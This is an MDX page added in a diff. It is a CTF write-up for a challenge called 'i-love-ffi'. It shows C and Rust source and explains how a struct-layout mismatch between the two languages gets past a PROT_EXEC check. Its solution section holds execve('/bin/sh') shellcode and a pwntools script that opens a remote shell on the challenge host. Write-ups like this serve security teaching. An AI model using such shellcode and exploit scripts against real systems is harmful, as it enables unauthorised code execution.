@@ -1,0 +1,150 @@
+export const layout = "./src/page.mdx";
+export const title = "i-love-ffi";
+
+# Provided Files
+- chal.c
+- chal
+- lib.rs
+- libi_love_ffi.so
+- Dockerfile
+
+```c filename="chal.c"
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <stddef.h>
+#include <unistd.h>
+#include <sys/mman.h>
+
+struct MmapArgs {
+    uint64_t * addr;
+    uint64_t length;
+    int protection;
+    int flags;
+    int fd;
+    uint64_t offset;
+};
+
+extern struct MmapArgs mmap_args();
+
+int main () {
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+
+    struct MmapArgs args = mmap_args();
+    char * buf = mmap(args.addr, args.length, args.protection, MAP_PRIVATE | MAP_ANON, args.fd, args.offset);
+    if (buf < 0) {
+        perror("failed to mmap");
+    }
+
+    read(0, buf, 0x1000);
+
+    printf("> ");
+    int op;
+    if (scanf("%d", &op) == 1) {
+        switch (op) {
+            case 0:
+                ((void (*)(void))buf)();
+                break;
+            case 1:
+                puts(buf);
+                break;
+        }
+    }
+}
+```
+
+```rs filename="lib.rs"
+#![allow(warnings)]
+
+pub struct MmapArgs {
+    addr: u64,
+    length: u64,
+    protection: u32,
+    flags: u32,
+    fd: u32,
+    offset: u64,
+}
+
+#[no_mangle]
+pub extern "C" fn mmap_args() -> MmapArgs {
+    let args = MmapArgs {
+        addr: read::<u64>(),
+        length: read::<u64>(),
+        protection: read::<u32>(),
+        flags: read::<u32>(),
+        fd: read::<u32>(),
+        offset: read::<u64>(),
+    };
+
+    if args.protection & 4 != 0 {
+        panic!("PROT_EXEC not allowed");
+    }
+
+    args
+}
+```
+
+# Intended
+The challenge provides the source for `chal` and `libi_love_ffi.so` in `chal.c` and
+`lib.rs` respectively. On the Rust side, an `mmap_args` function is defined that
+sets up the arguments and passes them over to C to execute. The Rust performs some
+basic checks to prevent passing the `PROT_EXEC` flag in the protections field, which
+should prevent allocating shellcode.
+
+However, although the struct definitions in Rust and C are equivalent with the
+layout and types exactly the same, when you are compiled they are generated
+differently. Modern compilers will typically pad struct fields so that memory
+accesses to those fields are faster. The problem is that Rust and C have different
+padding behavior. C will attempt to align struct fields to their memory size, but
+will maintain struct order. Rust will also attempt to align struct fields to their
+memory size, but will not maintain struct order.
+
+## memory layout
+| offset | C          | Rust       |
+|--------|------------|------------|
+| 0x00   | addr       | addr       |
+| 0x04   | addr       | addr       |
+| 0x08   | length     | length     |
+| 0x0C   | length     | length     |
+| 0x10   | protection | offset     |
+| 0x14   | flags      | offset     |
+| 0x18   | fd         | protection |
+| 0x1C   | [ unused ] | flags      |
+| 0x20   | offset     | fd         |
+| 0x24   | offset     | [ unused ] |
+
+As we can see in the above chart, the fields in Rust dont match up one-to-one to the
+struct fields on the C side. This allows us to bypass the protection check in rust
+and allocate shellcode.
+
+## Solution
+```x86asm filename="shellcode.asm" open
+    bits 64
+    
+_start:
+    mov rax, `/bin/sh`
+    push rax
+    mov eax, 0x3b
+    mov rdi, rsp
+    xor esi, esi
+    xor edx, edx
+    syscall
+```
+
+```python filename="main.py" open
+from pwn import *
+
+p = remote(args.HOST, args.PORT)
+
+for n in [0, 0x1000, 0, 0, 0, 7]:
+    p.sendlineafter(b"> ", str(n).encode())
+
+p.send(open("shellcode", "rb").read().ljust(4096, b"\x00"))
+p.sendlineafter(b"> ", b"0")
+
+p.interactive()
+```
+
+# Unintendeds
+No unintendeds :D
